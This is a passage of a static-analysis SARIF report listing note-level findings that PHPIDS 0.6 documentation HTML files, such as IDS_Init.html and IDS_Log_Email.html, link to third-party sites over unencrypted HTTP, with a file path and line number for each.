        "text" : "The file IDS_Filter_Storage.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "75BA5DECA7B8F10836514DEE1CFF6C02"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4550",
      "message" : {
        "text" : "The file IDS_Filter_Storage.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "75BA5DECA7B8F10836514DEE1CFF6C03"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
          },
          "region" : {
            "startLine" : 34,
            "endLine" : 34,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4551",
      "message" : {
        "text" : "The file IDS_Filter_Storage.html on line 416 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "75BA5DECA7B8F10836514DEE1CFF6C04"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
          },
          "region" : {
            "startLine" : 416,
            "endLine" : 416,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage.html:416"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
                },
                "region" : {
                  "startLine" : 416
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage.html:416"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage.html"
                },
                "region" : {
                  "startLine" : 416
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4519",
      "message" : {
        "text" : "The file IDS_Filter_Storage_Abstract.html on line 325 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "62B681357431DA46F5079AF236D757E4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage_Abstract.html"
          },
          "region" : {
            "startLine" : 325,
            "endLine" : 325,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage_Abstract.html:325"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage_Abstract.html"
                },
                "region" : {
                  "startLine" : 325
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Filter_Storage_Abstract.html:325"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Filter_Storage_Abstract.html"
                },
                "region" : {
                  "startLine" : 325
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4719",
      "message" : {
        "text" : "The file IDS_Init.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E99A4C23F462904BE6EFA27D9C5417E6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Init.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Init.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4720",
      "message" : {
        "text" : "The file IDS_Init.html on line 35 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E99A4C23F462904BE6EFA27D9C5417E7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
          },
          "region" : {
            "startLine" : 35,
            "endLine" : 35,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Init.html:35"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Init.html:35"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
                },
                "region" : {
                  "startLine" : 35
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4721",
      "message" : {
        "text" : "The file IDS_Init.html on line 410 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E99A4C23F462904BE6EFA27D9C5417E8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
          },
          "region" : {
            "startLine" : 410,
            "endLine" : 410,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Init.html:410"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
                },
                "region" : {
                  "startLine" : 410
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Init.html:410"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Init.html"
                },
                "region" : {
                  "startLine" : 410
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4704",
      "message" : {
        "text" : "The file IDS_Log_Composite.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E1D5783E24A4943D5D47D16183F5C3DF"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Composite.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Composite.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4705",
      "message" : {
        "text" : "The file IDS_Log_Composite.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E1D5783E24A4943D5D47D16183F5C3E0"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
          },
          "region" : {
            "startLine" : 34,
            "endLine" : 34,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Composite.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Composite.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4706",
      "message" : {
        "text" : "The file IDS_Log_Composite.html on line 240 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E1D5783E24A4943D5D47D16183F5C3E1"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
          },
          "region" : {
            "startLine" : 240,
            "endLine" : 240,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Composite.html:240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
                },
                "region" : {
                  "startLine" : 240
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Composite.html:240"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Composite.html"
                },
                "region" : {
                  "startLine" : 240
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4537",
      "message" : {
        "text" : "The file IDS_Log_Database.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6EE1B4A306EED69C2D8C564BDBD19713"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Database.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Database.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4538",
      "message" : {
        "text" : "The file IDS_Log_Database.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6EE1B4A306EED69C2D8C564BDBD19714"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
          },
          "region" : {
            "startLine" : 38,
            "endLine" : 38,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Database.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Database.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4539",
      "message" : {
        "text" : "The file IDS_Log_Database.html on line 197 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6EE1B4A306EED69C2D8C564BDBD19715"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
          },
          "region" : {
            "startLine" : 197,
            "endLine" : 197,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Database.html:197"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
                },
                "region" : {
                  "startLine" : 197
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Database.html:197"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Database.html"
                },
                "region" : {
                  "startLine" : 197
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4603",
      "message" : {
        "text" : "The file IDS_Log_Email.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9726E26A9E6E05D56ECC435F23413857"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Email.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Email.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4604",
      "message" : {
        "text" : "The file IDS_Log_Email.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9726E26A9E6E05D56ECC435F23413858"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
          },
          "region" : {
            "startLine" : 38,
            "endLine" : 38,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Email.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Email.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4605",
      "message" : {
        "text" : "The file IDS_Log_Email.html on line 304 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9726E26A9E6E05D56ECC435F23413859"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
          },
          "region" : {
            "startLine" : 304,
            "endLine" : 304,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Email.html:304"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
                },
                "region" : {
                  "startLine" : 304
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Email.html:304"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Email.html"
                },
                "region" : {
                  "startLine" : 304
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4645",
      "message" : {
        "text" : "The file IDS_Log_File.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B6B8215F10CE54F75A1BC6591FD58E28"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_File.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_File.html:37"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4646",
      "message" : {
        "text" : "The file IDS_Log_File.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B6B8215F10CE54F75A1BC6591FD58E29"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
          },
          "region" : {
            "startLine" : 38,
            "endLine" : 38,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_File.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_File.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4647",
      "message" : {
        "text" : "The file IDS_Log_File.html on line 231 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B6B8215F10CE54F75A1BC6591FD58E2A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
          },
          "region" : {
            "startLine" : 231,
            "endLine" : 231,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_File.html:231"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
                },
                "region" : {
                  "startLine" : 231
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_File.html:231"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_File.html"
                },
                "region" : {
                  "startLine" : 231
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4727",
      "message" : {
        "text" : "The file IDS_Log_Interface.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F07C1A863475074ED672B36001DA5E19"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Interface.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Interface.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4728",
      "message" : {
        "text" : "The file IDS_Log_Interface.html on line 32 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F07C1A863475074ED672B36001DA5E1A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
          },
          "region" : {
            "startLine" : 32,
            "endLine" : 32,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Interface.html:32"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Interface.html:32"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4729",
      "message" : {
        "text" : "The file IDS_Log_Interface.html on line 113 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F07C1A863475074ED672B36001DA5E1B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
          },
          "region" : {
            "startLine" : 113,
            "endLine" : 113,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Interface.html:113"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
                },
                "region" : {
                  "startLine" : 113
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Log_Interface.html:113"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Log_Interface.html"
                },
                "region" : {
                  "startLine" : 113
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4733",
      "message" : {
        "text" : "The file IDS_Monitor.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F0D3C6E6489308A719C0E8512F3A68E7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Monitor.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Monitor.html:33"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4734",
      "message" : {
        "text" : "The file IDS_Monitor.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F0D3C6E6489308A719C0E8512F3A68E8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
          },
          "region" : {
            "startLine" : 34,
            "endLine" : 34,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Monitor.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Monitor.html:34"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
